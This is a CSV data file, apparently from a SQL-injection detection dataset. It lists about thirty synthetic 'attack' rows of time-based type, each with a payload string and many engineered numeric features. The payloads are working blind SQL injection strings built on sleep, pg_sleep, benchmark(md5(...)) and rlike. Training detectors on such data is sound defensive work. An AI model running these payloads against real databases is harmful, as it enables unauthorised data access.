id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000243,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000065,0.05454223503317244,72.26086914742987,22.0,3.402646564333172,15.0,18.0,30.208695317943903,9.052173829485975,0.2076275185405036,0.2491530222486043,0.41796536588547345,0.1252540933254187,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.052173829485975,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000244,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000075,0.00391782312908475,92.99427472567385,26.002290109730463,3.7082263823077284,22.0,27.0,33.99541978053907,9.998854945134768,0.2365745303073284,0.2903414690135394,0.3655631352538152,0.10752086542531708,0.998854945134769,0.0011450548652310877,0.0,0.0,0.0,2.0,0.0,4.998854945134768,0.0,0.0,1.0,2.0,0.9988549451347687,0.0011450548652310877,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000245,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000012,0.08350423156333663,68.41455807916361,24.08291161583272,3.6614467238109496,17.1036395197909,19.165823231665442,24.124367423749078,8.02072790395818,0.25,0.27997984228762396,0.35269177655665296,0.11732838115572317,0.0,1.0,0.0,0.0,0.0,1.02072790395818,0.0,4.0,0.0,0.0,1.0,1.0207279039581802,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.020727903958180194,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0207279039581802
SMOTE_000246,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.16331381727114866,93.19239755311625,22.951900611720937,2.909981332924434,29.90380122344187,2.0,49.19239755311626,12.09619877655813,0.3209490729616014,0.021462720861741225,0.5278201410416933,0.12976806513496406,0.0,0.04809938827906407,0.0,0.0,1.0,0.0,0.0,10.048099388279065,0.0,0.0,0.0,1.0,0.0,0.048099388279064126,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.048099388279064015,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.048099388279065
SMOTE_000247,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,nearest_attack_euclidean,R000062,0.18168613461575664,77.31641197499636,16.065103621428918,2.631041378119387,18.902344567856623,1.9674481892855393,43.51172283928311,12.934896378571082,0.24479780674041515,0.025377448226333643,0.5623014517688356,0.1675232932644156,3.9674481892855407,0.0,0.0,0.0,0.0,1.0,0.0,7.902344567856622,0.0325518107144592,0.03255181071445917,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.03255181071445934,0.0,0.0,0.0,1.967448189285541,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9674481892855409,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.967448189285541
SMOTE_000248,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000012,2.701270981211849,72.88809738791781,25.466429216375342,3.6940907876959703,19.932858432750685,17.044761044832875,26.444048693958905,9.466429216375342,0.27193377033040045,0.23683444582922272,0.3621570463573111,0.12907473748306578,0.0,1.9776194775835616,0.0,0.0,0.0,1.0,0.0,4.4888097387917805,0.4888097387917808,0.0,1.0,1.0,0.0,1.0,0.0,0.5111902612082191,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.4888097387917809,0.0,0.0,0.0,0.4888097387917808,0.5111902612082192,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.488809738791781
SMOTE_000249,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000006,1.6792990183436647,67.40571527154147,24.937143514360976,3.6058643540755564,20.87428702872195,10.0,27.468571757180488,9.062856485639024,0.3091775041142646,0.14842838104624184,0.40754752385645426,0.1348465909830393,0.531428242819512,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.531428242819512,1.0,0.0,3.0,0.5314282428195117,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000250,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,2.617874705999769,64.0,23.73701599652237,3.5080383867516165,19.228359994203952,10.0,26.28029600811447,8.49134399768158,0.30044312490943675,0.15625,0.4106296251267886,0.1326772499637747,1.4913439976815805,0.0,1.5086560023184195,0.0,0.0,1.0,0.0,3.7543280011592097,0.0,0.0,0.0,3.0,1.0,0.0,0.7543280011592097,0.24567199884079036,0.0,1.0,1.0,0.0,0.0,0.0,0.2456719988407903,0.24567199884079033,0.0,1.0,0.0,0.24567199884079022,0.7543280011592097,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2456719988407903
SMOTE_000251,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,0.5834346708965116,58.2507940686601,21.250794068660102,3.374536884574737,15.752382205980306,10.0,24.623808897009848,7.874602965669949,0.27007938417153915,0.17169312049235602,0.4229629495143875,0.1352645458217173,0.12539703433005123,0.0,2.0,0.0,0.0,1.0,0.0,3.8746029656699488,0.0,0.0,0.874602965669949,3.0,0.12539703433005117,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1253970343300511,0.0,0.8746029656699489,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000252,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,2.052181915949832,64.49638138562952,23.48914415688854,3.425393006670601,18.496381385629512,10.0,28.0,8.0,0.2867388326295571,0.15505677551531366,0.4341589714428783,0.12404542041225095,0.49638138562951295,0.5036186143704869,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.4963813856295131,0.5036186143704869,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.49638138562951306,0.5036186143704869,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000253,attack,time,"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.558103681958693,76.30999854027463,27.476000583890144,3.6927304996053802,16.130999854027465,20.73800029194507,29.30999854027464,10.130999854027465,0.21158666861296715,0.27260236118433145,0.3829913617871229,0.13281960841557858,0.0,1.0,0.0,0.0,0.0,1.0,0.0,5.261999708054928,0.869000145972536,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.8690001459725358,0.13099985402746397,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000254,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000002,0.8178833088981718,86.32728844647819,26.178180770234786,3.6251096200440975,22.287276919060854,22.82181922976521,33.21819229765213,8.0,0.2581293670706677,0.2653529118099158,0.3833835437085185,0.09313417741089802,0.0,0.0,0.35636154046957347,0.0,0.0,1.0,0.0,5.643638459530426,0.0,0.0,1.0,1.3563615404695735,0.0,0.0,0.17818077023478673,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.8218192297652133,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.821819229765213
SMOTE_000255,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000050,0.11163361307385677,84.9565093784178,27.956509378417806,3.686997153358195,24.956509378417806,18.0,33.0,9.0,0.2937521796505698,0.21187434610482905,0.38843630119218664,0.10593717305241453,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.9565093784178073,0.043490621582192746,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000256,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,1.1690475310924993,61.538729612669336,23.0,3.5600549795181173,19.845952790497996,10.0,24.308094419004007,7.384682403167334,0.32355308478224576,0.16265955830034026,0.39391500355768616,0.11987235335972779,1.0,0.0,2.0,0.0,0.0,1.0,0.0,3.384682403167334,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.3846824031673342,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3846824031673344
SMOTE_000257,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000037,1.043979196527874,63.59365815855054,23.593658158550543,3.462984470706359,19.593658158550543,10.0,27.0,7.0,0.30806571403180155,0.15725779226549963,0.424596039116849,0.11008045458584975,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5936581585505428,0.40634184144945706,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000258,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000077,2.4925944643724054,75.13120629160755,19.751773226173587,2.992192277776445,23.125531967852076,4.376595903556229,36.75319180711246,10.875886613086795,0.3184064588612342,0.0487558596157098,0.4879883111560934,0.14484937036696263,0.0,3.375177322617359,0.0,0.0,0.0,1.0,0.0,6.125531967852076,0.0,0.0,0.37517732261735887,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6248226773826411,0.0,0.0,0.0,1.0,0.3751773226173588,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000259,attack,time,select pg_sleep  (  5  )   and    (    (   'rnzp'  =  'rnzp,nearest_attack_euclidean,R000057,0.48915254802146774,59.24758724088096,18.752412759119032,3.2323038319778,23.83494183941269,1.0,25.41264540146828,9.0,0.4024930220733203,0.01688146876957873,0.42869229023089234,0.15193321892620867,2.752412759119034,0.2475872408809664,0.0,0.0,0.0,1.0,0.0,4.082529080293655,0.0,0.9174709197063444,0.0,1.0,0.9174709197063445,0.08252908029365547,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.08252908029365547,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0825290802936554
SMOTE_000260,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,0.3845473732714689,56.338806763197276,19.0,3.213920102155336,22.22587117546485,1.0,25.0,8.112935587732425,0.39442949062823596,0.017754598437288965,0.44386496093222405,0.14395095000225108,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.11293558773242475,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8870644122675753,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8870644122675753
SMOTE_000261,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,1.090903138218771,62.118201666760996,23.8472806667044,3.586327503921272,20.1527193332956,10.0,24.541842000113196,7.4236403333522,0.3255592115373731,0.16123538034163848,0.39382309829180767,0.11938230982918077,1.0,0.0,2.0,0.0,0.0,1.0,0.0,3.423640333352199,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.4236403333521994,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4236403333521994
SMOTE_000262,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,0.00924619523078912,76.97278631904734,22.0,3.294898319225585,15.006280080219843,17.98325311941375,33.98743983956031,9.995813279853438,0.1949861549089322,0.23360396437743636,0.44154994577892337,0.12985993493470804,0.0,0.002093360073281314,2.0,0.0,0.0,1.9979066399267187,0.0,4.997906639926718,0.0,0.0,0.9979066399267187,3.9979066399267187,0.0,0.002093360073281203,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000263,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000008,2.500315359849897,57.56954768828062,21.09273025104083,3.4255766267547463,21.47681743723979,5.708643064841871,23.430452311719378,6.953634874479584,0.37353865839686884,0.09718960773089108,0.40794995074130436,0.12132178313093575,1.9536348744795842,0.0,0.0,0.0,0.0,1.0,0.0,3.4768174372397924,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.5231825627602078,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.47681743723979214,0.0,0.5231825627602078,0.0,0.4768174372397921,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.476817437239792
SMOTE_000264,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000021,1.4907576373461457,64.0,25.580303739081195,3.8005368291346633,22.300506231801993,10.0,21.97929127547721,9.720202492720798,0.34844540987190614,0.15625,0.3434264261793314,0.15187816394876247,2.7202024927207975,0.0,0.2797975072792025,0.0,0.0,1.0,0.0,3.1398987536396015,0.0,0.0,0.0,3.0,1.0,0.0,0.13989875363960125,0.8601012463603989,0.0,1.0,1.0,0.0,0.0,0.0,0.8601012463603989,0.8601012463603988,0.0,1.0,0.0,0.8601012463603988,0.13989875363960125,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.860101246360399
SMOTE_000265,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,1.3659749175210105,82.7814147286361,22.437170542727813,3.0875869203576176,30.0,2.0,40.17212209295414,10.609292635681953,0.36245028428294385,0.024163352285529585,0.48513920400775723,0.12824715942376932,0.6092926356819536,0.0,0.0,0.0,1.0,0.0,0.0,8.390707364318047,0.0,0.0,0.0,1.0,0.6092926356819535,0.0,0.0,0.6092926356819536,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000266,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,0.04549372129490986,58.05698860275774,21.018996200919247,3.333346181940964,15.028494301378872,10.0,25.028494301378874,8.0,0.2588356251181596,0.17226026777274317,0.4310958928909027,0.1378082142181945,0.009498100459624403,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.9905018995403756,3.0,0.009498100459624459,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.009498100459624403,0.0,0.9905018995403756,0.009498100459624403,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0094981004596244
SMOTE_000267,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,0.027306291095353714,79.15432000804215,18.022045715434594,2.974114663329729,14.0,18.0,38.13227429260756,9.022045715434594,0.17692112697528378,0.22747002039679343,0.4816367917259283,0.11397206090199448,0.0,0.0,0.0,0.0,0.0,2.0,0.0,6.022045715434594,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000268,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,2.0268673362935514,59.52309559540994,23.0,3.6460749374245807,21.0,10.0,22.0,6.523095595409947,0.3528290939255342,0.1680138542502544,0.36963047935055965,0.10952657247365175,1.0,0.0,1.0461911908198933,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.0461911908198935,1.0,0.0,0.5230955954099467,0.47690440459005334,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000269,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,0.16574118905437835,65.22756582362341,23.17067436771756,3.503174021705375,19.22756582362341,10.0,27.056891455905856,8.943108544094146,0.2946417007551119,0.15333876070541047,0.41483916775831625,0.1371803707811614,0.0,0.9431085440941468,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.9431085440941467,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000270,attack,time,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,nearest_attack_euclidean,R000064,2.2030578542307144,62.87297142678647,21.436485713393235,3.303179106628437,18.0,10.0,28.0,6.87297142678647,0.2863625288099404,0.15909029378330022,0.44545282259324065,0.10909435481351873,0.0,0.43648571339323483,0.8729714267864697,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.8729714267864697,0.0,0.43648571339323483,0.43648571339323483,0.5635142866067653,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000271,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000069,0.8882813409518473,96.09226605341912,28.0,3.630097772333489,28.80766628338695,18.0,38.52306651335478,10.76153325667739,0.2993631875475451,0.18756680397261405,0.40109548097793907,0.1119745275019018,0.0,0.7615332566773898,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.0,0.7615332566773898,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.2384667433226102,0.7615332566773898,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000272,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000048,1.2346909843260165,62.75019639366107,18.0,2.719091972469827,13.535630117002398,1.8214566276658655,34.75019639366107,12.642913255331734,0.2169758153428069,0.028802859480069443,0.5529072091618723,0.2013141160152514,0.5356301170023989,3.285826510663468,0.0,0.0,0.0,1.0,0.0,5.821456627665867,1.8214566276658672,0.17854337233413298,0.0,1.0,0.17854337233413298,0.821456627665867,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.17854337233413298,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.821456627665867,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000273,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,2.1056007186884274,75.2183240729355,25.084508714463,3.384824347160047,19.5422543572315,10.0,34.591561001241,11.084508714463,0.2624389613347033,0.13468725068832513,0.4551201672348754,0.1477536207420962,1.0,0.0,2.0,0.0,0.0,1.0,0.0,5.6267630716945,0.45774564276850005,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5422543572315,0.4577456427685,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
